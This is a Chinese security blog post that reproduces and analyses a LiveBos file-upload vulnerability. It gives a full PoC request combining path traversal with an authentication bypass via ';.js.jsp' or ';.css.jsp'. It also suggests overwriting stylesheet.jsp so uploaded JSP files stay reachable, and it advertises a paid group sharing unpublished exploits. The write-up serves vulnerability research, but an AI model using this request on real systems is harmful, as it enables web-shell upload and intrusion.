#  [漏洞分析]LiveBos文件上传漏洞复现及绕过分析   
原创 zzz  良月安全   2024-08-05 12:37  
  
## 免责声明  
  
本公众号所发布的所有内容，包括但不限于信息、工具、项目以及文章，均旨在提供学习与研究之用。所有工具安全性自测。如因此产生的一切不良后果与文章作者和本公众号无关。如有涉及公司与个人敏感信息，侵权烦请告知，我们会立即删除并致歉。  
  
## 前言  
  
最近看到了LiveBos的文件上传，发现他的绕过是;.js.jsp看样子像是利用某种解析差异的特性来绕过。但看完代码后发现是有点搞笑的，于是做个记录。  
  
## 漏洞复现  
  
利用poc如下：  
```
POST /feed/UploadFile.do;.js.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="file"; filename="//../../../../1.jsp"
Content-Type: image/png

123
-----------------------------45250802924973458471174811279
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxMcMxIarbcypBjQFXWdJynftDyjyiaibGiahYnWibag9ibNsI5DrkqIrtnibg/640?wx_fmt=png&from=appmsg "")  
  
上传后访问/1.jsp;.js.jsp  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxf4DqQyVIGI6OcR74tlUHBfyXpz3TtDUtS2S61kNjdheBVXgnSgCx5Q/640?wx_fmt=png&from=appmsg "")  
  
## 绕过分析  
  
这里对于文件上传漏洞具体的逻辑就不进行分析了，代码种同样还存在其他上传的接口。这里主要看下/feed/UploadFile.do;.js.jsp这个权限绕过是咋回事，因为直接访问/feed/UploadFile.do是会提示 "未登录或会话已过期"的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxS6dhWUoEBKuiaXiaqPeA6UTF01PHfwACRu5tqttPm5l7hxhniaK4r3ibicw/640?wx_fmt=png&from=appmsg "")  
  
;.js.jsp这个权限绕过的方式就很眼熟，最开始还以为又是利用解析的差异性来进行绕过的，但是测试发现/feed/UploadFile.do;.js，/feed/UploadFile.do;.js.png这种均无法进行绕过。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxEAv9icwjGhs4jytkHWGtDlIf4hv2G6c9CUbXbO8nZR1AJpkv8LKGc4Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxH0zibSfgu739ZMs4xoBcic498n50YvMibNcACT6ahRFa2QAFgEOfvOC3w/640?wx_fmt=png&from=appmsg "")  
  
查看源代码，寻找原因，在web.xml中看到2个关于.do文件的filter，LogonFilter和Compression Filter。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxmc3GzwiaReRfhNHVwdfSKt4FKWR9LRViap9jX9Zyv38p14pHvQvET8IA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxv3fXEU9xLxnp1ic744X5zvc8maS3huGylFYx7F92ah4lpDma0VZbXhQ/640?wx_fmt=png&from=appmsg "")  
  
Compression Filter中没有啥关于传入的url解析判断的逻辑。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxNyzAjvHzAGcTqe9gR5r95vhicTDRxNuicu1YwDibUrVZZWiaKibXbPVAoww/640?wx_fmt=png&from=appmsg "")  
  
LogonFilter中先从会话中获取登录用户的信息，并进行校验，因为我们没有进行登录，所以不会进入这个if分支。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxWZCpImF8cgQpzkJ8uP4wEviaSWNsdeEABosBnabngT5VicAVoXmWTKog/640?wx_fmt=png&from=appmsg "")  
  
在下一个if分支中，判断isIgnoreUri方法返回的值为true，为true则直接传递给下一个过滤器，否则抛出异常。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxicCczxDoq80wiaNCicmpe1ye0BkF6dpbIMYicJEQngnNibzY5iavjwwqGY3g/640?wx_fmt=png&from=appmsg "")  
  
在isIgnoreUri方法中，逻辑就很简单，在传入的uri等于/css/stylesheet.jsp，或者传入的uri以.js.jsp和.css.jsp结尾的时候，就会返回true。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxT0Daaw7JSaojcmAaCE9aSHN6ib8aGpYptJ4Mc05RNsMUCSSuv3zWMTQ/640?wx_fmt=png&from=appmsg "")  
  
这里就大概明白/feed/UploadFile.do;.js.jsp为什么能进行权限绕过了。。  
  
通过上述代码分析，不难发现，/feed/UploadFile.do;.css.jsp也是能进行权限绕过的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iavWjmQfnia2XM6vKnz1j8yxvbAXut0vTCYxxqkP6ibgfDA9gvPgd9GMxic5Zml3EnUjAJAM6g6icKQQg/640?wx_fmt=png&from=appmsg "")  
  
另外，上传后的jsp文件也是不能直接访问的，也要通过;.js.jsp或者;.css.jsp的形式来进行权限绕过，但其实可以覆盖原本的/css/stylesheet.jsp文件或者其他的.css.jsp和.js.jsp文件，/css/stylesheet.jsp文件及.css.jsp和.js.jsp文件本身的内容就是静态的内容，覆盖了影响也不大，这样就不用权限绕过也能访问到上传的jsp文件了。  
  
## 关于星球  
  
星球里有团队内部POC分享。星球定期更新安全内容，包括：内部漏洞库情报分享（包括部分未公开0/1day）、poc利用工具及内部最新研究成果。圈子目前价格为89元（交个朋友），后续人员加入数量多的话会考虑涨价（先到先得！！）感谢师傅们的支持！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/icm9yIBVk82iaClnv9oeuYRGNEgExPzA4cVrcGF1gvNM8e1LygD9R3vd29kbOS4ukYtibW9icNZBuqEzJXEl9enMkw/640?wx_fmt=png&from=appmsg "")  
  
